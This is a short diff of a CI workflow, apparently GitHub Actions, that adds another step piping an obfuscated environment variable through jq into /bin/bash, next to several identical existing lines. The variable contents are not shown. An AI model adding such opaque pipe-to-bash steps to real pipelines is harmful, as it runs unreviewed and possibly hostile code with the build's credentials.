@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vs6655" | jq -r .jo32582 | /bin/bash
           echo $lr91981 | jq -r .z57 | /bin/bash
           echo $vk543 | jq -r .rj155 | /bin/bash
+          printf '%s' "$bp070" | jq -r .olpl6 | /bin/bash
 
       - name: Persist results
         if: always()
